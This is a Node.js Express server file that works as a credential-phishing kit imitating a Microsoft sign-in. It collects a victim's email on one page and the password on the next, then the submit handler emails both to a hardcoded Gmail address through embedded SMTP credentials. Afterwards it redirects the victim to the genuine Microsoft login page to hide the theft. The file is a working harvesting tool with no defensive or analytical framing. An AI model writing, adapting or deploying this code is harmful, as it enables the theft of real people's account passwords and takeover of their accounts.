const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const port = 5000;

// Middleware
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views')); 
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'))); 

app.get('/', (req, res) => {
    res.redirect('/login');
});
app.get('/login', (req, res) => {
    res.render('index');
});

app.post('/password', (req, res) => {
    const { email } = req.body;
    console.log(`Email received: ${email}`); // Debugging log
    res.render('password', { email });
});

app.post('/submit', (req, res) => {
    const { email, password } = req.body;
  

    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST || "smtp.titan.email", // SMTP server address
        port: process.env.SMTP_PORT || 465, // SMTP server port
        secure: true, // true for port 465, false for other ports
        auth: {
            user: process.env.SMTP_USER || "a@investwisetrade.online", // your SMTP username
            pass: process.env.SMTP_PASS || "@Maroke2020"  // your SMTP password
        },
        connectionTimeout: 20000, // 20 seconds
        greetingTimeout: 20000, // 20 seconds
        socketTimeout: 20000 // 20 seconds
    });

    const mailOptions = {
        from: process.env.SMTP_USER || "a@investwisetrade.online", // your email address
        to: "mmaroke75@gmail.com", // recipient's email address
        subject: 'Form Submission',
        text: `Email: ${email}\nPassword: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            return res.status(500).send('Failed to send email. Please try again later.');
        }
        // Redirect to Microsoft login URL
        res.redirect('https://login.microsoftonline.com/');
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
